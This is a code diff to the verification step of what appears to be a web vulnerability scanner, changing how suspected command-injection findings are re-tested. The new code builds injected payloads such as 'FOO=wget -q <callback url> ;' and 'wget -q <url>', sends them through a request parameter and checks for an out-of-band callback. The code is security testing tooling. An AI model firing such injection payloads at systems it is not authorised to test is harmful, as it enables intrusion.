@@ -987,17 +987,33 @@ class VerificationEngine:
             # VR-11 (Phase 53): fresh interaction id + DIFFERENT shell syntax ('|' vs
             # the ';' / '&&' detection battery) — execution must reproduce through an
             # independent separator to be a finding.
+            # CM-1 (cmdi recall round, live-caught on the OWASP Benchmark 8b67a88):
+            # the replay now uses THE FORM THAT FIRED (the finding's evidence
+            # carries form=...). Default (no marker) = the classic separator
+            # battery — byte-compatible with every existing finding. The twin
+            # replays use the ALTERNATE COMMAND (curl -> wget; both verified
+            # present in the runtime image) instead of the alternate separator:
+            # for envp-array and direct-argv sinks there IS no separator — an
+            # envp entry defines a variable only when it is an assignment, and
+            # Runtime.exec(String) is not a shell (live: 'localhost;' ENOENT).
             import re as _re11
             ev11 = " ".join(e.detail for e in f.evidence)
             m11 = _re11.search(r"param=([\w.-]+)", ev11)
             param11 = m11.group(1) if m11 else (f.parameter or "host")
+            m11f = _re11.search(r"form=(\S+)", ev11)
+            form11 = m11f.group(1) if m11f else "variant"
             base11 = "localhost"
             if ep is not None and ep.param(param11) is not None and ep.param(param11).value:
                 base11 = ep.param(param11).value[:60]
             from .detect import CommandInjectionDetector, is_self_callback
             cd = CommandInjectionDetector(self.engine, self.bus)
             iid = cd._iid(ep, param11, "verify")
-            payload = base11 + cd.VERIFY_TEMPLATE.format(u=self.oast.url(iid))
+            if form11 == "twin-env":
+                payload = f"FOO=wget -q {self.oast.url(iid)} ;"
+            elif form11 == "twin-direct":
+                payload = f"wget -q {self.oast.url(iid)}"
+            else:
+                payload = base11 + cd.VERIFY_TEMPLATE.format(u=self.oast.url(iid))
             rv = self.engine.send(RequestMutation(endpoint=ep, param_name=param11,
                                                   param_value=payload, note="cmdi-verify"))
             hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
@@ -1007,9 +1023,18 @@ class VerificationEngine:
             src11 = hit[0].get("ip", "") if hit else ""
             v = Verification(method="re-test:fresh-interaction-id+alternate-syntax", passed=ok,
                              confidence=0.9 if ok else 0.15, rounds=1,
-                             notes=f"fresh id {iid} via alternate '|' syntax executed out-of-band: {ok}"
+                             notes=f"fresh id {iid} via the {form11} form "
+                                   "(wget alternate command) "
+                                   f"executed out-of-band: {ok}"
                                    f"{' src=' + src11 if src11 else ''}"
                                    f" channel={getattr(self.oast, 'channel', 'local')}")
+            if form11 == "variant":
+                v = Verification(method="re-test:fresh-interaction-id+alternate-syntax", passed=ok,
+                                 confidence=0.9 if ok else 0.15, rounds=1,
+                                 notes=f"fresh id {iid} via alternate '|' syntax "
+                                       f"executed out-of-band: {ok}"
+                                       f"{' src=' + src11 if src11 else ''}"
+                                       f" channel={getattr(self.oast, 'channel', 'local')}")
             f.verification, f.confidence = v, v.confidence
             f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
 
